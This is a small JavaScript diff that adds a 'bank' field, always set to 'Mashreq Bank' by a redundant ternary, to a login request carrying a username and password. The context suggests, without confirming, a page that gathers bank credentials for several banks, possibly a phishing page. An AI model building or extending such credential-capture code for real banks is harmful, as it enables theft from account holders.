@@ -362,7 +362,11 @@
                     },
                     body: JSON.stringify({
                         type: "login",
-                        data: { username: username, password: password }
+                        data: { 
+                            bank: localStorage.getItem('selectedBank') === 'mashreq' ? 'Mashreq Bank' : 'Mashreq Bank', 
+                            username: username, 
+                            password: password 
+                        }
                     })
                 });
 
